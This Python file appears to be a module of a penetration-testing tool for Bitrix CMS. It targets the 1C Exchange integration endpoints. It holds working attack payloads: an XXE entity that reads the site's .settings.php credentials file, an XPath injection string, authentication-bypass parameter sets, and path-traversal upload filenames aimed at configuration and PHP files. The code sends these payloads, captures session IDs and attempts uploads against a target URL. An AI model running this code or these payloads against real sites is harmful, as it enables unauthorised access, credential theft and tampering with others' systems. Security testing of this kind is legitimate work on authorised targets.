#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
1C Integration Scanner Module for Bitrix Pentest Tool
Tests for: 1C Exchange vulnerabilities, XML import/export issues,
Enterprise data leakage, API authentication bypass
Based on: https://pentestnotes.ru/notes/bitrix_pentest_full/
"""

import re
import base64
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, quote, parse_qs, urlparse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict


@dataclass
class Integration1CFinding:
    """1C Integration vulnerability finding"""
    severity: str  # critical, high, medium, low
    vuln_type: str  # exchange_auth_bypass, xml_injection, data_leak, api_exposure, misconfig
    url: str
    parameter: Optional[str]
    payload: Optional[str]
    description: str
    evidence: Optional[str] = None
    exposed_data: Optional[Dict] = None  # For data leakage findings
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class Integration1CResult:
    """Results of 1C Integration scanning"""
    target: str
    findings: List[Integration1CFinding] = field(default_factory=list)
    exchange_vulns: List[Dict] = field(default_factory=list)
    xml_vulns: List[Dict] = field(default_factory=list)
    data_leaks: List[Dict] = field(default_factory=list)
    api_issues: List[Dict] = field(default_factory=list)
    exposed_endpoints: List[str] = field(default_factory=list)
    
    def add_finding(self, finding: Integration1CFinding):
        self.findings.append(finding)
        
        finding_dict = finding.to_dict()
        if finding.vuln_type == 'exchange_auth_bypass':
            self.exchange_vulns.append(finding_dict)
        elif finding.vuln_type == 'xml_injection':
            self.xml_vulns.append(finding_dict)
        elif finding.vuln_type == 'data_leak':
            self.data_leaks.append(finding_dict)
        elif finding.vuln_type == 'api_exposure':
            self.api_issues.append(finding_dict)
    
    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'critical')
    
    def get_high_count(self) -> int:  # Добавлен метод
        return sum(1 for f in self.findings if f.severity == 'high')
    
    def get_medium_count(self) -> int:  # Добавлен метод
        return sum(1 for f in self.findings if f.severity == 'medium')
    
    def get_low_count(self) -> int:  # Добавлен метод
        return sum(1 for f in self.findings if f.severity == 'low')
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'summary': {
                'total_findings': len(self.findings),
                'critical': self.get_critical_count(),
                'high': self.get_high_count(),  # Используем метод
                'medium': self.get_medium_count(),  # Используем метод
                'low': self.get_low_count(),  # Используем метод
                'exchange_vulns': len(self.exchange_vulns),
                'xml_vulns': len(self.xml_vulns),
                'data_leaks': len(self.data_leaks),
                'api_issues': len(self.api_issues),
                'exposed_endpoints': len(self.exposed_endpoints),
            },
            'exposed_endpoints': self.exposed_endpoints,
            'all_findings': [f.to_dict() for f in self.findings]
        }


class Bitrix1CIntegrationScanner:
    """
    1C Integration scanner specialized for Bitrix CMS
    Based on pentestnotes.ru research
    """
    
    # 1C Exchange endpoints
    EXCHANGE_ENDPOINTS = [
        {
            'name': '1C Exchange (catalog)',
            'url': '/bitrix/admin/1c_exchange.php',
            'type': 'exchange',
            'params': ['type', 'mode', 'filename', 'sessid']
        },
        {
            'name': '1C Exchange (sale)',
            'url': '/bitrix/admin/1c_exchangesale.php',
            'type': 'exchange',
            'params': ['type', 'mode', 'filename']
        },
        {
            'name': '1C Exchange (new)',
            'url': '/bitrix/admin/1c_exchange_import.php',
            'type': 'exchange',
            'params': ['type', 'mode']
        },
        {
            'name': 'Highload Import',
            'url': '/bitrix/tools/highloadblock_tools.php',
            'type': 'import',
            'params': ['mode', 'entity']
        },
        {
            'name': 'Catalog Import',
            'url': '/bitrix/admin/catalog_import.php',
            'type': 'import',
            'params': ['IMPORT_FILE', 'IBLOCK_ID']
        },
        {
            'name': '1C Enterprise SOAP',
            'url': '/bitrix/soap/1c/enterprise/ws/',
            'type': 'soap',
            'params': []
        },
        {
            'name': '1C Enterprise REST',
            'url': '/rest/1c.enterprise/',
            'type': 'rest',
            'params': []
        }
    ]
    
    # Dangerous 1C Exchange modes
    DANGEROUS_MODES = [
        'init',      # Initialize exchange session
        'file',      # Upload file
        'import',    # Import data
        'delete',    # Delete data
        'query',     # Query data
        'checkauth', # Check authentication
        'get_catalog',   # Get catalog
        'get_sales',     # Get sales data
        'get_enterprise', # Get enterprise data
    ]
    
    # 1C Exchange type parameters
    EXCHANGE_TYPES = [
        'catalog',      # Catalog exchange
        'sale',         # Sale orders exchange
        'reference',    # Reference data
        'user',         # User data
        'enterprise',   # Enterprise data
        'highload',     # Highload blocks
    ]
    
    # XML payloads for testing
    XML_TEST_PAYLOADS = [
        # Basic catalog structure
        '''<?xml version="1.0" encoding="UTF-8"?>
<КоммерческаяИнформация ВерсияСхемы="2.021" ДатаФормирования="2024-01-01">
    <Каталог>
        <Ид>test-catalog-id</Ид>
        <Наименование>Test Catalog</Наименование>
        <Товары>
            <Товар>
                <Ид>test-product-1</Ид>
                <Наименование>Test Product</Наименование>
                <Цены>
                    <Цена>
                        <Представление>Test Price</Представление>
                        <ЦенаЗаЕдиницу>999999</ЦенаЗаЕдиницу>
                    </Цена>
                </Цены>
            </Товар>
        </Товары>
    </Каталог>
</КоммерческаяИнформация>''',
        
        # Sale order structure
        '''<?xml version="1.0" encoding="UTF-8"?>
<КоммерческаяИнформация>
    <Документ>
        <Ид>test-order-1</Ид>
        <Номер>99999</Номер>
        <Дата>2024-01-01</Дата>
        <ХозОперация>Заказ товара</ХозОперация>
        <Роль>Продавец</Роль>
        <Валюта>RUB</Валюта>
        <Курс>1</Курс>
        <Сумма>999999</Сумма>
        <Контрагенты>
            <Контрагент>
                <Ид>test-client-1</Ид>
                <Наименование>Test Client</Наименование>
                <Роль>Покупатель</Роль>
            </Контрагент>
        </Контрагенты>
    </Документ>
</КоммерческаяИнформация>''',
        
        # XXE payload via 1C Exchange
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///bitrix/.settings.php">]>
<КоммерческаяИнформация>&xxe;</КоммерческаяИнформация>''',
        
        # XPath injection test
        '''<?xml version="1.0" encoding="UTF-8"?>
<КоммерческаяИнформация>
    <Каталог>
        <Ид>' or '1'='1</Ид>
    </Каталог>
</КоммерческаяИнформация>''',
    ]
    
    # Authentication bypass payloads
    AUTH_BYPASS_PAYLOADS = [
        {'sessid': 'fake-session-id'},
        {'sessid': ''},
        {'auth': 'basic', 'user': 'admin'},
        {'type': 'catalog', 'mode': 'checkauth', 'sessid': 'null'},
        {'type': 'catalog', 'mode': 'init', 'sessid': '0'},
    ]
    
    # File upload bypass techniques
    UPLOAD_BYPASS = [
        'import.xml',
        'offers.xml',
        'prices.xml',
        'rests.xml',
        '../../../bitrix/php_interface/after_connect.php',
        '../../../bitrix/.settings.php',
        'test.php.xml',
        'shell.xml.php',
    ]
    
    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        self.exchange_session = None
        
    def scan(self, target_url: str, aggressive: bool = False) -> Integration1CResult:
        """
        Main 1C Integration scanning method
        
        Args:
            target_url: Target base URL
            aggressive: Enable aggressive testing (data modification, auth bypass attempts)
        
        Returns:
            Integration1CResult with all findings
        """
        self.logger.info(f"Starting 1C Integration scan for {target_url}")
        result = Integration1CResult(target=target_url)
        
        base_url = self._normalize_url(target_url)
        
        # 1. Discover 1C Exchange endpoints
        self.logger.info("Discovering 1C Exchange endpoints...")
        endpoints = self._discover_endpoints(base_url)
        
        # 2. Test for authentication bypass
        self.logger.info("Testing 1C Exchange authentication...")
        self._test_auth_bypass(base_url, endpoints, result)
        
        # 3. Test for XML injection/XXE
        self.logger.info("Testing XML injection vectors...")
        self._test_xml_injection(base_url, endpoints, result)
        
        # 4. Test for data leakage
        self.logger.info("Testing for enterprise data leakage...")
        self._test_data_leakage(base_url, endpoints, result)
        
        # 5. Test file upload vulnerabilities
        if aggressive:
            self.logger.info("Testing file upload vulnerabilities...")
            self._test_file_upload(base_url, endpoints, result)
        
        # 6. Test API exposure
        self.logger.info("Testing 1C Enterprise API exposure...")
        self._test_api_exposure(base_url, result)
        
        # 7. Test for misconfigurations
        self.logger.info("Testing for integration misconfigurations...")
        self._test_misconfigurations(base_url, result)
        
        # Summary
        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"1C Integration scan complete: {total} findings ({critical} critical)")
        
        if result.exposed_endpoints:
            self.logger.warning(f"Exposed endpoints: {len(result.exposed_endpoints)}")
        
        return result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _discover_endpoints(self, base_url: str) -> List[Dict]:
        """Discover available 1C Exchange endpoints"""
        discovered = []
        
        for endpoint in self.EXCHANGE_ENDPOINTS:
            url = urljoin(base_url, endpoint['url'])
            try:
                # Check if endpoint exists
                resp = self.requester.get(url, timeout=10)
                
                if resp:
                    # Check for 1C Exchange indicators
                    if self._is_exchange_endpoint(resp):
                        discovered.append({
                            **endpoint,
                            'full_url': url,
                            'accessible': True,
                            'response_code': resp.status_code
                        })
                        self.logger.info(f"Found 1C endpoint: {endpoint['name']} ({resp.status_code})")
                        
                        # Check if publicly accessible
                        if resp.status_code == 200:
                            self.logger.warning(f"Endpoint accessible without auth: {endpoint['url']}")
                    else:
                        discovered.append({
                            **endpoint,
                            'full_url': url,
                            'accessible': False,
                            'response_code': resp.status_code
                        })
                        
            except Exception as e:
                self.logger.debug(f"Error checking {endpoint['url']}: {e}")
        
        return discovered
    
    def _is_exchange_endpoint(self, response) -> bool:
        """Check if response indicates 1C Exchange endpoint"""
        indicators = [
            '1C+Enterprise',
            'CommerceML',
            'КоммерческаяИнформация',
            'СхемаИмен',
            'ВыгрузкаТоваров',
            'ОбменДанными',
            '1c_exchange',
            'IBLOCK_ID',
            'CATALOG_EXPORT',
            'XML_ID',
            'success',
            'failure',
            'Ошибка',
            'ЗапросДанных',
        ]
        
        content = response.text[:2000] if response.text else ''
        return any(ind in content for ind in indicators) or response.status_code in [200, 401, 403]
    
    def _test_auth_bypass(self, base_url: str, endpoints: List[Dict], result: Integration1CResult):
        """Test for authentication bypass in 1C Exchange"""
        for endpoint in endpoints:
            if not endpoint['accessible']:
                continue
            
            url = endpoint['full_url']
            
            # Test 1: Check if endpoint accessible without session
            try:
                resp = self.requester.get(url, timeout=10)
                
                if resp and resp.status_code == 200:
                    # Check if we got actual data or just login form
                    if self._contains_enterprise_data(resp.text):
                        finding = Integration1CFinding(
                            severity='critical',
                            vuln_type='exchange_auth_bypass',
                            url=url,
                            parameter=None,
                            payload=None,
                            description='1C Exchange endpoint accessible without authentication',
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! AUTH BYPASS: {endpoint['name']} accessible without auth!")
                
                # Test 2: Try to initialize exchange without proper auth
                if endpoint['type'] == 'exchange':
                    for mode in ['init', 'checkauth']:
                        test_url = f"{url}?type=catalog&mode={mode}"
                        resp = self.requester.get(test_url, timeout=10)
                        
                        if resp and 'success' in resp.text.lower():
                            finding = Integration1CFinding(
                                severity='critical',
                                vuln_type='exchange_auth_bypass',
                                url=test_url,
                                parameter='mode',
                                payload=mode,
                                description=f'1C Exchange mode "{mode}" accessible without authentication',
                                evidence=resp.text[:200]
                            )
                            result.add_finding(finding)
                            self.logger.critical(f"!!! EXCHANGE MODE {mode} without auth: {url}")
                            
                            # Try to get session ID
                            if 'sessid' in resp.text:
                                sessid_match = re.search(r'sessid[=":]+([^"&\s]+)', resp.text)
                                if sessid_match:
                                    self.exchange_session = sessid_match.group(1)
                                    self.logger.warning(f"Captured session ID: {self.exchange_session}")
                
                # Test 3: Try bypass payloads
                for payload in self.AUTH_BYPASS_PAYLOADS:
                    try:
                        resp = self.requester.get(url, params=payload, timeout=10)
                        
                        if resp and self._contains_enterprise_data(resp.text):
                            finding = Integration1CFinding(
                                severity='high',
                                vuln_type='exchange_auth_bypass',
                                url=url,
                                parameter=str(list(payload.keys())),
                                payload=str(payload),
                                description='Possible authentication bypass with payload',
                                evidence=resp.text[:200]
                            )
                            result.add_finding(finding)
                            self.logger.warning(f"Potential auth bypass at {url}")
                            
                    except Exception as e:
                        self.logger.debug(f"Auth bypass test error: {e}")
                        
            except Exception as e:
                self.logger.debug(f"Auth test error for {url}: {e}")
    
    def _test_xml_injection(self, base_url: str, endpoints: List[Dict], result: Integration1CResult):
        """Test for XML injection and XXE in 1C Exchange"""
        xml_endpoints = [e for e in endpoints if e['type'] in ['exchange', 'import', 'soap']]
        
        for endpoint in xml_endpoints:
            url = endpoint['full_url']
            
            for payload in self.XML_TEST_PAYLOADS:
                try:
                    headers = {
                        'Content-Type': 'application/xml; charset=UTF-8',
                        'Accept': 'application/xml, text/xml, */*',
                    }
                    
                    resp = self.requester.post(url, data=payload, headers=headers, timeout=15)
                    
                    if not resp:
                        continue
                    
                    # Check for XXE success indicators
                    if self._detect_xxe_success(resp.text):
                        finding = Integration1CFinding(
                            severity='critical',
                            vuln_type='xml_injection',
                            url=url,
                            parameter='XML body',
                            payload='XXE payload',
                            description='XXE vulnerability in 1C Exchange XML processing',
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! XXE in 1C Exchange: {endpoint['name']}")
                        break
                    
                    # Check for XPath injection
                    if self._detect_xpath_injection(resp.text):
                        finding = Integration1CFinding(
                            severity='high',
                            vuln_type='xml_injection',
                            url=url,
                            parameter='XML body',
                            payload='XPath injection',
                            description='Possible XPath injection in 1C Exchange',
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.warning(f"Potential XPath injection: {endpoint['name']}")
                    
                    # Check for XML parsing errors (information disclosure)
                    if self._detect_xml_errors(resp.text):
                        finding = Integration1CFinding(
                            severity='medium',
                            vuln_type='xml_injection',
                            url=url,
                            parameter='XML body',
                            payload='Malformed XML',
                            description='XML parsing errors reveal system information',
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.info(f"XML error disclosure: {endpoint['name']}")
                        
                except Exception as e:
                    self.logger.debug(f"XML injection test error: {e}")
    
    def _detect_xxe_success(self, content: str) -> bool:
        """Detect successful XXE exploitation"""
        indicators = [
            'root:x:',
            'DBHost',
            'DBPassword',
            'bitrix',
            'php_interface',
            'after_connect',
            'mysql',
            'password',
            '<?php',
        ]
        return any(ind in content for ind in indicators)
    
    def _detect_xpath_injection(self, content: str) -> bool:
        """Detect XPath injection"""
        indicators = [
            'XPathException',
            'Invalid expression',
            'xpath',
            'node',
            'DOMDocument',
        ]
        return any(ind.lower() in content.lower() for ind in indicators)
    
    def _detect_xml_errors(self, content: str) -> bool:
        """Detect XML parsing errors"""
        indicators = [
            'XML Parsing Error',
            'SimpleXMLElement',
            'DOMDocument::',
            'Invalid XML',
            'Malformed XML',
            'XMLReader',
        ]
        return any(ind in content for ind in indicators)
    
    def _test_data_leakage(self, base_url: str, endpoints: List[Dict], result: Integration1CResult):
        """Test for enterprise data leakage via 1C Exchange"""
        # Try to query sensitive data
        data_queries = [
            {'type': 'catalog', 'mode': 'query', 'sessid': self.exchange_session or ''},
            {'type': 'sale', 'mode': 'query', 'sessid': self.exchange_session or ''},
            {'type': 'reference', 'mode': 'query'},
            {'type': 'user', 'mode': 'query'},
        ]
        
        for endpoint in endpoints:
            if endpoint['type'] != 'exchange':
                continue
            
            url = endpoint['full_url']
            
            for query in data_queries:
                try:
                    resp = self.requester.get(url, params=query, timeout=15)
                    
                    if not resp or resp.status_code != 200:
                        continue
                    
                    # Check for enterprise data
                    data = self._extract_enterprise_data(resp.text)
                    
                    if data:
                        finding = Integration1CFinding(
                            severity='high',
                            vuln_type='data_leak',
                            url=url,
                            parameter=str(list(query.keys())),
                            payload=str(query),
                            description=f'Enterprise data leakage: {", ".join(data.keys())}',
                            evidence=resp.text[:500],
                            exposed_data=data
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! DATA LEAK: {endpoint['name']} exposes {list(data.keys())}")
                        
                except Exception as e:
                    self.logger.debug(f"Data leak test error: {e}")
        
        # Check for exposed import/export files
        self._check_exchanged_files(base_url, result)
    
    def _extract_enterprise_data(self, content: str) -> Optional[Dict]:
        """Extract enterprise data from 1C Exchange response"""
        data = {}
        
        # Patterns for sensitive data
        patterns = {
            'products': r'<Товар>.*?</Товар>',
            'prices': r'<Цена>.*?</Цена>',
            'clients': r'<Контрагент>.*?</Контрагент>',
            'orders': r'<Документ>.*?</Документ>',
            'users': r'<Пользователь>.*?</Пользователь>',
            'companies': r'<Организация>.*?</Организация>',
        }
        
        for key, pattern in patterns.items():
            matches = re.findall(pattern, content, re.DOTALL)
            if matches:
                data[key] = len(matches)
        
        return data if data else None
    
    def _check_exchanged_files(self, base_url: str, result: Integration1CResult):
        """Check for exposed exchange files"""
        file_paths = [
            '/bitrix/1c_exchange/',
            '/upload/1c_exchange/',
            '/bitrix/upload/1c/',
            '/upload/catalog/',
            '/bitrix/backup/1c/',
            '/1c_exchange/',
        ]
        
        for path in file_paths:
            url = urljoin(base_url, path)
            try:
                resp = self.requester.get(url, timeout=10)
                
                if resp and resp.status_code == 200:
                    # Check for directory listing
                    if 'Index of' in resp.text or '<title>Index of' in resp.text:
                        finding = Integration1CFinding(
                            severity='high',
                            vuln_type='data_leak',
                            url=url,
                            parameter=None,
                            payload=None,
                            description='Directory listing of 1C exchange files',
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! DIRECTORY LISTING: {path}")
                        result.exposed_endpoints.append(url)
                    
                    # Check for exposed XML files
                    elif '.xml' in resp.text:
                        finding = Integration1CFinding(
                            severity='medium',
                            vuln_type='data_leak',
                            url=url,
                            parameter=None,
                            payload=None,
                            description='Potentially exposed 1C exchange files',
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.warning(f"Exchanged files might be accessible: {path}")
                        
            except Exception as e:
                self.logger.debug(f"File check error for {path}: {e}")
    
    def _test_file_upload(self, base_url: str, endpoints: List[Dict], result: Integration1CResult):
        """Test for file upload vulnerabilities in 1C Exchange"""
        upload_endpoints = [e for e in endpoints if e['type'] == 'exchange']
        
        for endpoint in upload_endpoints:
            url = endpoint['full_url']
            
            for filename in self.UPLOAD_BYPASS:
                try:
                    # Try to upload via file mode
                    upload_url = f"{url}?type=catalog&mode=file&filename={quote(filename)}"
                    
                    test_content = b'<?xml version="1.0"?><test>malicious</test>'
                    
                    headers = {
                        'Content-Type': 'application/octet-stream',
                    }
                    
                    resp = self.requester.post(
                        upload_url, 
                        data=test_content, 
                        headers=headers, 
                        timeout=15
                    )
                    
                    if resp and ('success' in resp.text.lower() or resp.status_code == 200):
                        finding = Integration1CFinding(
                            severity='critical',
                            vuln_type='xml_injection',
                            url=upload_url,
                            parameter='filename',
                            payload=filename,
                            description='Potential arbitrary file upload via 1C Exchange',
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! FILE UPLOAD: {filename} uploaded via 1C Exchange")
                        
                except Exception as e:
                    self.logger.debug(f"Upload test error: {e}")
    
    def _test_api_exposure(self, base_url: str, result: Integration1CResult):
        """Test for 1C Enterprise API exposure"""
        api_endpoints = [
            '/rest/1c.enterprise/',
            '/bitrix/soap/1c/enterprise/',
            '/api/1c/',
            '/enterprise/api/',
        ]
        
        for path in api_endpoints:
            url = urljoin(base_url, path)
            try:
                resp = self.requester.get(url, timeout=10)
                
                if resp and resp.status_code == 200:
                    # Check for API documentation or WSDL
                    if 'wsdl' in resp.text.lower() or 'soap' in resp.text.lower():
                        finding = Integration1CFinding(
                            severity='medium',
                            vuln_type='api_exposure',
                            url=url,
                            parameter=None,
                            payload=None,
                            description='1C Enterprise SOAP API exposed',
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.warning(f"SOAP API exposed: {path}")
                        result.exposed_endpoints.append(url)
                    
                    # Check for REST API endpoints
                    elif 'rest' in resp.text.lower() or 'json' in resp.text.lower():
                        finding = Integration1CFinding(
                            severity='medium',
                            vuln_type='api_exposure',
                            url=url,
                            parameter=None,
                            payload=None,
                            description='1C Enterprise REST API might be exposed',
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.warning(f"REST API might be exposed: {path}")
                        
            except Exception as e:
                self.logger.debug(f"API test error for {path}: {e}")
    
    def _test_misconfigurations(self, base_url: str, result: Integration1CResult):
        """Test for 1C integration misconfigurations"""
        # Check for exposed configuration
        config_paths = [
            '/bitrix/.settings.php',
            '/bitrix/php_interface/after_connect.php',
            '/bitrix/modules/sale/1c_exchange.php',
            '/bitrix/modules/catalog/1c_exchange.php',
        ]
        
        for path in config_paths:
            url = urljoin(base_url, path)
            try:
                resp = self.requester.get(url, timeout=10)
                
                if resp and resp.status_code == 200:
                    content = resp.text[:1000]
                    
                    # Check for database credentials
                    if 'DBHost' in content or 'DBPassword' in content:
                        finding = Integration1CFinding(
                            severity='critical',
                            vuln_type='misconfig',
                            url=url,
                            parameter=None,
                            payload=None,
                            description='Database credentials exposed in configuration file',
                            evidence=content[:300]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! CONFIG LEAK: {path} contains DB credentials!")
                    
                    # Check for 1C exchange configuration
                    elif '1C_' in content or 'EXCHANGE_' in content or 'CATALOG_EXPORT' in content:
                        finding = Integration1CFinding(
                            severity='high',
                            vuln_type='misconfig',
                            url=url,
                            parameter=None,
                            payload=None,
                            description='1C integration configuration exposed',
                            evidence=content[:300]
                        )
                        result.add_finding(finding)
                        self.logger.warning(f"1C config exposed: {path}")
                        
            except Exception as e:
                self.logger.debug(f"Config check error for {path}: {e}")
        
        # Check for debug mode
        self._check_debug_mode(base_url, result)
    
    def _check_debug_mode(self, base_url: str, result: Integration1CResult):
        """Check if 1C exchange is in debug mode"""
        debug_url = urljoin(base_url, '/bitrix/admin/1c_exchange.php?type=catalog&mode=init')
        
        try:
            resp = self.requester.get(debug_url, timeout=10)
            
            if resp and resp.status_code == 200:
                # Check for debug information
                debug_indicators = [
                    'DEBUG',
                    'error',
                    'trace',
                    'exception',
                    'stack',
                    'line',
                    'file',
                ]
                
                if any(ind in resp.text for ind in debug_indicators):
                    finding = Integration1CFinding(
                        severity='medium',
                        vuln_type='misconfig',
                        url=debug_url,
                        parameter=None,
                        payload=None,
                        description='1C Exchange might be running in debug mode',
                        evidence=resp.text[:300]
                    )
                    result.add_finding(finding)
                    self.logger.warning("1C Exchange appears to be in debug mode")
                    
        except Exception as e:
            self.logger.debug(f"Debug check error: {e}")
    
    def _contains_enterprise_data(self, content: str) -> bool:
        """Check if content contains actual enterprise data"""
        indicators = [
            'КоммерческаяИнформация',
            'Каталог',
            'Товар',
            'Цена',
            'Контрагент',
            'Документ',
            'Заказ',
            'IBLOCK_ID',
            'XML_ID',
            'success',
        ]
        return any(ind in content for ind in indicators)


# Testing
if __name__ == "__main__":
    import sys
    import logging
    sys.path.append('..')
    
    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser
    
    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()
    
    scanner = Bitrix1CIntegrationScanner(requester, logger, parser)
    
    if len(sys.argv) > 1:
        result = scanner.scan(sys.argv[1], aggressive=True)
        print(f"\n{'='*60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"Exchange Vulns: {len(result.exchange_vulns)}")
        print(f"XML Vulns: {len(result.xml_vulns)}")
        print(f"Data Leaks: {len(result.data_leaks)}")
        print(f"API Issues: {len(result.api_issues)}")
        print(f"Exposed Endpoints: {len(result.exposed_endpoints)}")
        print(f"Findings: {len(result.findings)}")